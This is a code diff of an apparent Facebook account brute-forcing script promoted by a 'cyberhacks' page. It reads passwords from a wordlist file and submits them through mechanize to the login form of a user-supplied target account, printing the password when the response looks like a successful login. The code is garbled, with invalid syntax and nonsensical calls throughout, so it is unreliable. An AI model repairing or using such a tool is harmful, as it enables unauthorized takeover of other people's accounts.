@@ -30,7 +30,7 @@ print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __|
 print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /\033[1;31m') 
 print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/\033[1;31m')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
-file=open('password.txt')
+file=open('password.txt','r')
 
 web = mechanize.Browser()
 
@@ -40,9 +40,13 @@ def login( email, password):
 email = input("INPUT TARGET ACCOUNT MAIL/PROFILE LINK:")
 print(" TARGET MAIL /PROF LINK:",email+"")
 
-content = file.readlines()
-X = Trying
-print('X + content')
+i=0
+while file:
+    passer=file.readline().strip()
+    i+=1
+    if len(passer) < 11:
+        continue
+    print("Try"+passer)
 excepthandler
 
 ConnectionError
@@ -50,18 +54,18 @@ ConnectionError
 Try
 print('\033[1;31mNO INTERNET CONNECTION OR CONNECTION TIMEOUT\033[1;0m')
 
-request = web.open(urlopen)
-Try
+requests = web.open(urlopen)
  
 If; responses; code = 200
 web.select_form(nr=0)()
 web.form['email']=email
-web.form['pass']=file
+web.form['pass']=passer
 responses = web.submit()
 responses_data = responses.read()
 'find friends' in responses_data or 'two-factor authentication' in responses_data or 'security code' in responses_data;
-print("your password is : ",file)
+print("your password is : ",passer)
 Break
+
 
 
 
